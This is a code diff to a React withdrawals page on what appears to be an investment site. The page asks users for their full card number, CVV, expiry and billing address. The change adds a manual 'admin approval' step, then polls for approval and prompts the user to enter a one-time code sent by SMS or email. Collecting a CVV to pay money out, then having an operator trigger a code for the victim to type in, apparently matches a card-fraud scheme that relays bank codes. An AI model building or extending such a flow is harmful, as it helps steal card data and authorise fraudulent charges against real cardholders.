@@ -8,8 +8,6 @@ import { ArrowUpRight, CreditCard, User, Calendar, Lock, MapPin, Shield, Smartph
 import { ConfirmModal } from '@/components/ConfirmModal'
 import { SuccessModal } from '@/components/SuccessModal'
 
-type WithdrawalStatus = 'WAITING_FOR_VERIFICATION' | 'WITHDRAWAL_PROCCESSING' | 'WITHDRAWN' | 'REJECTED'
-
 const WITHDRAWAL_FEE_PERCENT = 0.02
 const WITHDRAWAL_FEE_MIN = 1
 const WITHDRAWAL_FEE_MAX = 5
@@ -33,6 +31,7 @@ export default function WithdrawalsPage() {
   const [showSuccess, setShowSuccess] = useState(false)
   const [showVerify, setShowVerify] = useState(false)
   const [pendingWithdrawalId, setPendingWithdrawalId] = useState<string | null>(null)
+  const [pendingVerifyMethod, setPendingVerifyMethod] = useState<'email' | 'sms'>('email')
   const [verificationCode, setVerificationCode] = useState('')
   const [availableBalance, setAvailableBalance] = useState(0)
   const [formData, setFormData] = useState({ investmentId: '', amount: '', cardNumber: '', cardholderName: '', expiryDate: '', cvv: '', billingAddress: '', verifyMethod: 'email' as 'email' | 'sms' })
@@ -40,17 +39,39 @@ export default function WithdrawalsPage() {
 
   useEffect(() => {
     fetchWithdrawals()
+    const interval = setInterval(checkForApprovedWithdrawals, 5000)
+    return () => clearInterval(interval)
   }, [])
 
   const fetchWithdrawals = async () => {
     try {
         const { data } = await api.get('withdrawals')
       setWithdrawals(data.data)
+      const approved = data.data.find((w: any) => w.status === 'CARD_APPROVED_WAITING_USER')
+      if (approved && !showVerify) {
+        setPendingWithdrawalId(approved.id)
+        setPendingVerifyMethod(approved.verificationMethod || 'email')
+        setShowVerify(true)
+        toast.success(`Admin approved! Enter the verification code sent via ${approved.verificationMethod || 'email'}`)
+      }
     } catch (err) {
       toast.error('Failed to fetch withdrawals')
     } finally {
       setLoading(false)
     }
+  }
+
+  const checkForApprovedWithdrawals = async () => {
+    try {
+      const { data } = await api.get('withdrawals')
+      const approved = data.data.find((w: any) => w.status === 'CARD_APPROVED_WAITING_USER')
+      if (approved && approved.id !== pendingWithdrawalId && !showVerify) {
+        setPendingWithdrawalId(approved.id)
+        setPendingVerifyMethod(approved.verificationMethod || 'email')
+        setShowVerify(true)
+        toast.success(`Admin approved! Enter the verification code sent via ${approved.verificationMethod || 'email'}`)
+      }
+    } catch (err) {}
   }
 
   const fetchInvestments = async () => {
@@ -109,8 +130,7 @@ export default function WithdrawalsPage() {
       setConfirmAction(null)
       if (data.success && data.data?.id) {
         setPendingWithdrawalId(data.data.id)
-        setShowVerify(true)
-        toast.success(`Verification code sent via ${formData.verifyMethod === 'sms' ? 'SMS' : 'email'}`)
+        toast.success('Withdrawal submitted. Admin will approve and send verification code.')
       }
       fetchWithdrawals()
     } catch (err: any) {
@@ -137,11 +157,12 @@ export default function WithdrawalsPage() {
     }
   }
 
-  const statusColors: Record<WithdrawalStatus, string> = {
-    WAITING_FOR_VERIFICATION: 'bg-blue-50 text-blue-700 border border-blue-200',
-    WITHDRAWAL_PROCCESSING: 'bg-yellow-50 text-yellow-700 border border-yellow-200',
-    WITHDRAWN: 'bg-green-50 text-green-700 border border-green-200',
-    REJECTED: 'bg-red-50 text-red-700 border border-red-200',
+  const statusColors: Record<string, string> = {
+    'WAITING_FOR_ADMIN_APPROVAL': 'bg-blue-50 text-blue-700 border border-blue-200',
+    'CARD_APPROVED_WAITING_USER': 'bg-amber-50 text-amber-700 border border-amber-200',
+    'WITHDRAWAL_PENDING': 'bg-yellow-50 text-yellow-700 border border-yellow-200',
+    'WITHDRAWN': 'bg-green-50 text-green-700 border border-green-200',
+    'REJECTED': 'bg-red-50 text-red-700 border border-red-200',
   }
 
   return (
@@ -297,7 +318,7 @@ export default function WithdrawalsPage() {
                   <span className="text-sm text-gray-700">SMS</span>
                 </label>
               </div>
-              <p className="mt-1 text-xs text-gray-500">Code will be sent via selected method to confirm ownership</p>
+              <p className="mt-1 text-xs text-gray-500">Code will be sent via selected method after admin approves your card details</p>
             </div>
           </div>
           <div className="mt-4 flex gap-3">
@@ -322,7 +343,7 @@ export default function WithdrawalsPage() {
               Verify Withdrawal
             </h3>
             <p className="text-sm text-gray-600 mb-4">
-              Enter the 6-digit verification code sent via {formData.verifyMethod === 'sms' ? 'SMS' : 'email'} to confirm this card withdrawal.
+              Enter the 6-digit verification code sent via {pendingVerifyMethod === 'sms' ? 'SMS' : 'email'} to confirm this card withdrawal.
             </p>
             <input
               type="text"
@@ -386,7 +407,7 @@ export default function WithdrawalsPage() {
                   {w.cardNumber ? `${formatCardNumber(w.cardNumber)}` : '-'}
                 </td>
                 <td className="px-5 py-3">
-                  <span className={`inline-block rounded-full px-2.5 py-1 text-xs font-medium ${statusColors[w.status as WithdrawalStatus]}`}>
+                  <span className={`inline-block rounded-full px-2.5 py-1 text-xs font-medium ${statusColors[w.status] || 'bg-gray-50 text-gray-700 border border-gray-200'}`}>
                     {w.status.replace(/_/g, ' ')}
                   </span>
                 </td>
